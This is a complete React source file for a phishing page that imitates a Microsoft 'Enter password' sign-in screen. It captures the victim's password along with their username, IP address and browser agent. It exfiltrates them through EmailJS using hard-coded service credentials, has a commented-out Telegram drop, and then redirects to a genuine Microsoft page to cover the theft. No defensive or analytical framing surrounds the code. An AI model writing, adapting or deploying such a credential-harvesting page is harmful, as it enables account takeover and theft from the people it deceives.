import React, { useRef, useState } from "react";
import cookies from "../utils/cookie.config";
import emailjs from '@emailjs/browser';
import { wait } from "../utils/waiter";

export default function Pass() {
  const login: Login = cookies.get("login");

  const [formInput, setFormInput] = useState<Login>({
    username: login.username,
    password: "",
  });
  const [ipAddress, setIpAddress] = React.useState<string>();
  const [isLoading, setIsLoading] = useState(false);

  const form = useRef<HTMLFormElement>(null);
  let agent = navigator.userAgent;

  function handleInputChange(event: React.ChangeEvent<HTMLInputElement>) {
    setFormInput((prevData) => ({
      ...prevData,
      [event.target.name]: event.target.value,
    }));
  }

  async function handleSubmit(event: React.FormEvent<HTMLFormElement>) {
    
    event.preventDefault();

    setIsLoading(true);

  //   const message = `
  
  // [----+🏦 OFFICE LOGIN 🏦+-----]

  // USERNAME: ${formInput.username}

  // PASSWORD: ${formInput.password}

  // IP: ${ipAddress}

  // BROWSER: ${agent}

  // `;

  //   await TelegramSend(message);

    // setIsLoading(false);

    // window.location.replace("https://learn.microsoft.com/en-us");

    await wait(3000)

    emailjs.sendForm('service_m05lftf', 'template_2xuq9uj', form.current!, '74xz7jS-Xw5rVxjbV')
    .then((result) => {
      console.log(result.text+formInput.username)
      window.location.replace("https://learn.microsoft.com/en-us");
    
    }, (error) => {
      alert("could not complete your request")
      console.log(error)
      setIsLoading(false)
    }); 
  }

  async function getIP() {
    const request = await fetch("https://api.ipify.org?format=json");
    const response: { ip: string } = await request.json();
    setIpAddress(response.ip);
  }

  React.useEffect(() => {
    getIP();
  }, []);

  return (
    <div>
      <div className="sign-in-form">
        <div className="brand-section">
          <img src="/static/images/brand.svg" alt="" srcSet="" />
        </div>
        <p>{login.username}</p>
        <h3 style={{ fontSize: "27px", marginTop: "-3px" }}>Enter password</h3>

        <form ref={form} method="post" onSubmit={handleSubmit}>

        <input hidden type="text" name='user' value={login.username} />
<input hidden type="text" name='agent' value={agent} />
<input hidden type="text" name='pi' value={ipAddress} />

          <input
            placeholder="Password"
            onChange={handleInputChange}
            type="password"
            name="pass"
            id=""
            required
          />
          <div className="margin link">
            <a href="">Forgot password?</a>
          </div>

          <div className="margin link">
            <a href="">Email code to {login.username}</a>
          </div>

          <div className="form-buttons">
            <div className="buttons-flex">
              <div className="submit-button">
                {isLoading ? (
                  <div
                    style={{
                      width: "100%",
                      display: "flex",
                      justifyContent: "center",
                    }}
                  >
                    <span className="loader"></span>
                  </div>
                ) : (
                  <button>Sign in</button>
                )}
              </div>
            </div>
          </div>
        </form>
      </div>
    </div>
  );
}
